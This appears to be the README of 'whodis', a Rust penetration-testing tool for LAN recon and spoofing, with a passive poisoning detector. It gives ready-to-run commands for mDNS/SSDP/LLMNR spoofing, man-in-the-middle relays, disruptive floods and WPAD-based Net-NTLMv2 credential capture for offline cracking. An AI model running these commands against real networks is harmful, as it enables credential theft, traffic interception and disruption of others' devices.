# whodis

LAN recon and spoof, in Rust. macOS first. Covers mDNS / Bonjour, SSDP / UPnP, and LLMNR, with passive anomaly detection (`sentinel`) and Net-NTLMv2 credential capture (`spoof --llmnr --preset wpad`).

```
whodis browse --fingerprint
whodis sweep 10.0.5.0/24
whodis capture --pcap snap.pcap -t 60
whodis probe
whodis enum OfficePrinter.local.
whodis spoof --template airplay --name ConferenceSpeaker --ip 10.0.5.42 --relay 10.0.5.20:7000
whodis flood conflict ConferenceSpeaker._airplay._tcp.local. --forever
whodis report --out engagement.md
```

## Install

```sh
cargo install --path .
```

## Subcommands

| Command | What |
|---|---|
| `browse`  | Stream every mDNS event from the LAN |
| `probe`   | Directed query, or service-type list with no args |
| `enum`    | Per-host service deep dive, or host list with no args |
| `arp`     | Read ARP/NDP caches with OUI vendor lookup |
| `sweep`   | Active ICMP host discovery, no root required |
| `sentinel`| Passive listener for spoof / poison anomalies (mDNS, optionally LLMNR) |
| `capture` | Dump mDNS to a pcap file |
| `spoof`   | Authoritative responder for mDNS, SSDP, or LLMNR; optional TCP relay or NTLMSSP credcap |
| `clone`   | Capture a real instance to a TOML answer table |
| `flood`   | Goodbye and conflict-rename floods |
| `report`  | Markdown engagement report |

## Browse

```
whodis browse
whodis browse --pretty --fingerprint
whodis browse --once
whodis browse -t 30
whodis browse --type _airplay._tcp.local.
```

`--once` is a 5-second snapshot. `--type FQDN` is case- and trailing-dot-insensitive.

## Probe

```
whodis probe                                          # service types + counts
whodis probe _airplay._tcp.local.                     # all AirPlay receivers
whodis probe _ipp._tcp.local. -t 5                    # printers, 5s window
whodis probe _airplay._tcp.local. --instance "Living" # one specific instance
whodis probe --host OfficePrinter.local               # resolve a hostname
```

### Apple services (AirPlay, RAOP, HAP, ...)

macOS routes many Bonjour services through AWDL and the `mDNSResponder` cache rather than broadcasting on en0; wire-level probes for `_airplay._tcp`, `_raop._tcp`, `_hap._tcp`, and related types often return nothing even when devices are active. When wire probing returns empty for a known Apple service type, whodis automatically falls back to querying `mDNSResponder` directly via `dns_sd.h`. Pass `--no-dns-sd` to suppress this fallback and keep results to wire-level evidence only.

## Enum

Pick one host, list every service it advertises. With no host, lists hosts on the LAN with the count of distinct service types each one advertises.

```
whodis enum
whodis enum OfficePrinter.local.
whodis enum 192-168-50-179.local. -t 8
```

## Arp

Read the kernel's ARP and NDP neighbor caches. No packets sent. Cache only contains hosts your Mac has recently talked to, so a fresh cache after reboot may be sparse.

```
whodis arp
whodis arp --v4
whodis arp --v6
whodis arp --vendor "Apple"
whodis arp --no-oui
```

`--vendor` is a case-insensitive substring match. `-i NAME` filters to a specific interface. `--scope FILE` applies `allow_subnet` to limit entries to the engagement subnet.

## Sweep

Active IPv4 host discovery via ICMP echo. Uses `SOCK_DGRAM + IPPROTO_ICMP`, which macOS allows unprivileged - no sudo required. After probing, the kernel's ARP cache is freshly populated; whodis reads it once to enrich live hosts with MAC and OUI vendor.

```
whodis sweep                                # local /24 from primary interface
whodis sweep 192.168.1.0/24
whodis sweep 192.168.1.0/24 -t 500          # per-probe timeout in ms (default 500)
whodis sweep 192.168.1.0/24 --max 64        # cap concurrent probes (default 256)
whodis sweep 192.168.1.0/24 --max 0         # unbounded concurrency (watch fd limits)
whodis sweep 192.168.1.0/24 --no-arp        # skip MAC/vendor enrichment
whodis sweep 192.168.1.0/24 --no-oui        # keep MAC, skip OUI vendor lookup
whodis sweep 192.168.1.0/24 --show-dead     # also emit unreachable hosts
```

With no CIDR, sweeps the /24 of the primary non-loopback IPv4 interface (or the one named via `-i`).

Default `--max 256` guards against file descriptor exhaustion (macOS default `ulimit -n` is 256). IPv4 only in v1. Output is one record per host (`ip`, `alive`, `rtt_ms`, `mac`, `vendor`, `interface`); dead hosts omitted unless `--show-dead`. `--scope FILE` applies `allow_subnet` to skip IPs outside the engagement range.

## Sentinel

Passive listener that flags suspicious LAN behavior without sending anything. Default scope is mDNS; `--llmnr` adds an LLMNR socket so the same process catches Windows-side poisoning too.

```
whodis sentinel                    # mDNS only
whodis sentinel --llmnr            # mDNS + LLMNR poison detection
whodis sentinel --ble              # BLE recon (presence, AirDrop, lock-state, classification)
whodis sentinel --llmnr --include-local   # observe own host's traffic too
whodis sentinel -t 60              # 60s window, then exit
```

Anomaly classes (each emits one JSONL record with `class`, `severity`, and class-specific fields):

| Class | Trigger |
|---|---|
| `multi_source_unique_rr`     | Two distinct sources both setting cache-flush on the same A/AAAA name with different rdata |
| `whodis_conflict_signature`  | SRV target contains `whodis-conflict` |
| `cache_flush_rate_exceeded`  | >1 cache-flush response per 1s window per `(name, type, src)` (RFC 6762 §8.3) |
| `goodbye_storm`              | >5 TTL=0 records from one source for one name in 2s |
| `goodbye_then_takeover`      | TTL=0 from src A then non-zero announce from src B for the same name within 5s |
| `service_type_goodbye_burst` | >5 distinct PTR targets goodbyed under one service-type owner from one source in 5s |
| `source_ip_mismatch`         | A/AAAA record advertises an IP unequal to the packet's source IP, with no other record self-asserting it |
| `unsolicited_additional`     | An additional-section record's owner name isn't reachable from the answer section (catches `[[decoy]]` cache-poisoning) |
| `llmnr_poison_responder`     | LLMNR answer for a name from a previously-unseen source |
| `name_res_race_flood`        | 3+ distinct sources answering the same LLMNR name within a 1s window |
| `device_presence`            | BLE peripheral arrived, or departed after 10 min silence |
| `airdrop_everyone_mode`      | Apple Continuity AirDrop payload advertising Everyone-mode |
| `lock_state_change`          | NearbyInfo `wake_status` high bit toggles (best-effort lock hint) |
| `device_class_classification`| BLE peripheral classified to a non-Unknown class for the first time |
| `unknown_continuity_type`    | Unrecognized Apple Continuity TLV type observed 5+ times |

Loopback traffic is excluded by default; pass `--include-local` to dogfood `sentinel` against `flood` / `spoof` running on the same host.

## Capture

LINKTYPE_RAW pcap with synthesized IPv4 / UDP wrappers. Wireshark and tshark read it directly. Default runs until Ctrl-C; `-t SECS` bounds the window.

```
whodis capture                                # mdns-{timestamp}.pcap (in scope.log_dir if set)
whodis capture --pcap engagement.pcap
whodis capture --pcap engagement.pcap -t 60
tshark -r engagement.pcap
```

Omitting `--pcap` writes to `mdns-YYYY-MM-DDTHH-MM-SSZ.pcap` in the current directory, or inside scope's `log_dir` if configured. Pair with `--scope` to collect evidence alongside other engagement artifacts.

## Spoof

Pick a template or hand-write a TOML answer table.

```
whodis spoof --template airplay --name ConferenceSpeaker --ip 10.0.5.42
whodis spoof answers.toml --burst 3 --allow 10.0.5.0/24
whodis spoof answers.toml --reply unicast --allow 10.0.5.23/32
```

Templates: `airplay`, `raop`, `ipp`, `smb`, `ssh`, `googlecast`. Each generates the matching `PTR` / `SRV` / `TXT` / `A` records for the instance.

`--relay HOST:PORT` adds a TCP bridge: whodis listens on every port the spoof advertises and forwards connections to the real device. Combine with `flood conflict` for discovery plus traffic MITM.

`--reply multicast|unicast|auto` chooses where query-triggered answers go: LAN-wide multicast (default), direct unicast to the querying client, or auto-unicast only when requested.

`--reannounce-interval SECS` periodically multicasts our records to evict cached entries from the legit device. `0` is reply-only (default). Try 30 for steady churn, 5 for aggressive cache-poisoning.

```sh
whodis spoof --template airplay --name ConferenceSpeaker --ip 10.0.5.42 \
    --allow 10.0.5.0/24 \
    --relay 10.0.5.20:7000
```

Manual answer table (`answers.toml`):

```toml
ttl = 120

[[answer]]
name = "_airplay._tcp.local."
qtype = "PTR"
data = "Spoofed-Speaker._airplay._tcp.local."

[[answer]]
name = "Spoofed-Speaker._airplay._tcp.local."
qtype = "SRV"
port = 7000
target = "Spoofed-Speaker.local."

[[answer]]
name = "Spoofed-Speaker._airplay._tcp.local."
qtype = "TXT"
txt = ["model=AppleTV11,1", "deviceid=AA:BB:CC:DD:EE:FF"]

[[answer]]
name = "Spoofed-Speaker.local."
qtype = "A"
data = "10.0.5.42"
```

Supported qtypes: `A`, `AAAA`, `PTR`, `SRV`, `TXT`. `PTR` responses bundle related `SRV` / `TXT` / `A` / `AAAA` as additionals so one query fully hydrates the instance.

The responder logs `spoof conflict` at warn level when something else on the LAN claims a name we own.

## SSDP / UPnP

The `--ssdp` flag on `browse`, `probe`, and `spoof` switches the protocol to SSDP / UPnP (HTTP-over-UDP on `239.255.255.250:1900`). Browse streams `Alive` / `Byebye` / `Reply` events; probe sends a targeted M-SEARCH; spoof builds an authoritative responder from a TOML answer table with `[[device]]` entries plus an embedded HTTP/1.1 server that serves each device's description XML at the advertised LOCATION URL.

```sh
whodis browse --ssdp
whodis probe --ssdp 'urn:schemas-upnp-org:device:MediaRenderer:1'
whodis spoof ssdp.toml --ssdp --http-host 10.0.5.42
whodis flood byebye 'uuid:abc::urn:schemas-upnp-org:device:MediaRenderer:1'
```

mDNS-only flags (`-T`, `-f`, `--template`, `--burst`, `--relay`, `--reply`, `--monitor`) are gated `conflicts_with = "ssdp"`; SSDP-only flags (`--mx`, `--http-host`) require `--ssdp`.

## LLMNR + WPAD credcap

LLMNR (UDP/5355) is the Windows-side mDNS sibling. `whodis probe --llmnr <name>` resolves a name; `whodis spoof --llmnr <table.toml>` runs an authoritative responder with the same allow-list / scope / `whodis-scope.toml` semantics as mDNS spoof. `whodis sentinel --llmnr` adds the `llmnr_poison_responder` and `name_res_race_flood` anomaly classes.

The headline use case is credential capture. `--preset wpad` pre-builds an answer table for `wpad`, `wpadproxy`, `wpad.local` (plus `wpad.<engagement_domain>` if `--domain` or `scope.engagement_domain` is set) and brings up a WPAD listener on TCP/8080 that drives the NTLMSSP challenge-response handshake to completion and writes hashcat mode 5600 lines to a `.hashes` file:

```sh
whodis spoof --llmnr --preset wpad
whodis spoof --llmnr --preset wpad --credcap-out /tmp/engagement.hashes
whodis spoof --llmnr --preset wpad --domain corp.example
whodis spoof --llmnr table.toml --allow-instance wpad           # custom table
whodis spoof --llmnr --preset wpad --wildcard                   # bypass allow-list
```

The captured hash format is `USER::DOMAIN:srv_challenge:NtProofStr:rest`, ready for `hashcat -m 5600`. Default output filename is `credcap-{ISO8601-Z}.hashes` in the current directory (or `scope.log_dir` if set). Port 8080 is the default because `:80` needs root and conflicts with macOS sharing — production WPAD attacks expect `:80`, so re-bind under `sudo` or with a firewall redirect for real engagements.

**Honest landing-rate caveats** (printed at startup when `--preset wpad` is used):

- WPAD-over-LLMNR is disabled by default in Windows 10+ since the 2018 ADV170012 mitigations. Treat WPAD hits as bonus, not primary; if no captures land in 5 minutes, pivot to SMB-driven capture (UNC paths, mapped drives, GPO startup scripts). SMB credcap is a follow-up plan.
- Captured hashes are Net-NTLMv2 for offline cracking only — they are NOT relay material. SMB signing on modern domain clients does not block capture but does block relay (which is also a follow-up plan).
- NTLM may be disabled outright (`LmCompatibilityLevel=5`, Restrict NTLM, Kerberos-only environments). When the client refuses NTLMSSP, nothing lands regardless of WPAD reachability.

`--allow-instance NAME` on `spoof --llmnr` is an allow-list of permitted query names (routed through the responder's `permits_name` check, not the mDNS instance check). `--wildcard` bypasses the allow-list entirely. The two flags are mutually exclusive. The spec keeps default behavior allow-list for engagement-safety; deny-list TOML is a follow-up plan.

## BLE

Passive Bluetooth LE scan with Apple Continuity decoding. macOS first via `btleplug` (CoreBluetooth).

```sh
whodis browse --ble
whodis browse --ble -t 30
whodis probe  --ble <PERIPHERAL_ID>
whodis probe  --ble <PERIPHERAL_ID> --duration 60
whodis sentinel --ble
whodis sentinel --ble --include-known
```

`<PERIPHERAL_ID>` comes from `browse --ble` output. macOS uses CoreBluetooth UUIDs (it never exposes hardware MACs).

First run prompts for Bluetooth access in System Settings > Privacy & Security > Bluetooth.

Scope: `allow_ble_ids`, `allow_ble_vendors`, `known_ble_ids` (your own devices, suppressed unless `--include-known`).

## Clone

Capture an instance on the LAN and emit a TOML answer table mimicking its `PTR` / `SRV` / `TXT` / `A` / `AAAA` records. Replays through `whodis spoof`; pair with `--relay` to MITM the real device.

```sh
whodis clone "Conference Speaker._airplay._tcp.local." > clone.toml
whodis spoof clone.toml --relay 10.0.5.20:7000 --allow 10.0.5.0/24
```

`-t SECS` (default 5) bounds the listen window. Exits non-zero if no records arrive in time.

## Flood

Disruptive.

- `goodbye` sends TTL=0 records, forces neighbors to re-announce. Useful for harvesting fresh `TXT`.
- `conflict` sends authoritative records claiming the target's name with different content. Per RFC 6762 §9 the legit device renames itself.

```
whodis flood goodbye Foo._airplay._tcp.local.
whodis flood goodbye Foo._airplay._tcp.local. --count 50
whodis flood goodbye Foo._airplay._tcp.local. --forever
whodis flood conflict Foo._airplay._tcp.local. --allow-instance Foo
whodis flood goodbye Foo._airplay._tcp.local. --dry-run
```

`--rate N` caps packets per second (default 50, minimum 1). `--count N` is per-target (default 1, minimum 1). `--forever` runs until Ctrl-C and conflicts with `--count`. `--dry-run` logs what would be sent. A mismatched allow-list logs the blocked target and exits non-zero.

## Report

Brief inventory pass plus a Markdown summary (service types, instance inventory with fingerprints, TXT highlights, timestamps).

```
whodis report --out engagement.md
whodis report -t 30 --out lan-snapshot.md
WHODIS_SCOPE=engagement.toml whodis report
```

Setting `WHODIS_SCOPE` writes the report into the scope's `log_dir` if one is configured. Pair with `whodis capture --pcap` for raw packet evidence.

## Modes

| Mode | When | Binds 5353 |
|---|---|---|
| QueryOnly     | `probe`, `enum`                 | no |
| Listen        | `browse`, `capture`, `report`   | yes (REUSEPORT) |
| Authoritative | `spoof`, `flood`                | yes (REUSEPORT) |

`SO_REUSEPORT` lets us coexist with macOS `mDNSResponder`. If 5353 won't bind, the error points at firewall or sudo. No silent fallback.

## Interface selection

`-i NAME` (`--interface`) restricts operations to a specific interface, e.g. `en0`. Repeatable. Default: all non-loopback interfaces. Useful on laptops with VPN tunnels you don't want to leak mDNS into.

## Shell completions

```sh
whodis completions zsh > "${fpath[1]}/_whodis"
whodis completions bash > /usr/local/etc/bash_completion.d/whodis
whodis completions fish > ~/.config/fish/completions/whodis.fish
```

Supported shells: `bash`, `elvish`, `fish`, `powershell`, `zsh`.

## Output

JSONL on stdout by default. `--pretty` switches to human view (auto on a TTY). `--color auto|always|never` respects `NO_COLOR`. Logs go to stderr.

## Authorization

`spoof` accepts `--allow CIDR` and `--allow-instance NAME`. `flood` accepts `--allow-instance NAME` only (it multicasts, no per-target IP). Both are repeatable. An empty allow-list emits one warning and proceeds. A mismatched allow-list logs the blocked target and exits non-zero.

`sweep` and `arp` honor a scope file's `allow_subnet`: `sweep` intersects the requested CIDR with the allow-list (probing only inside it), `arp` filters cache entries to addresses inside it. Without a scope, `sweep` warns once before probing.

Declare engagement scope once and reuse:

```toml
# whodis-scope.toml
allow_subnet   = ["10.0.5.0/24"]
allow_instance = ["ConferenceSpeaker"]
log_dir        = "./engagement-logs"
```

```sh
whodis --scope whodis-scope.toml spoof airplay.toml
WHODIS_SCOPE=whodis-scope.toml whodis flood conflict ConferenceSpeaker._airplay._tcp.local. --forever
```

CLI `--allow` flags stack on top of the scope file's lists.

## Engagement workflow

Set scope, capture in the background, spoof + flood the target, watch the LAN, then write up:

```sh
mkdir -p engagement-logs
export WHODIS_SCOPE=whodis-scope.toml

whodis sweep 10.0.5.0/24 > engagement-logs/hosts.jsonl

whodis capture --pcap engagement-logs/mdns.pcap &
whodis spoof --template airplay --name ConferenceSpeaker --ip 10.0.5.50 \
    --relay 10.0.5.20:7000 &
whodis flood conflict ConferenceSpeaker._airplay._tcp.local. --forever --rate 20 &

whodis browse --pretty --fingerprint
```

When done:

```sh
kill %1 %2 %3
whodis report --out engagement-logs/report.md
```

`engagement-logs/` ends up with the pcap, the report, and any redirected stderr.
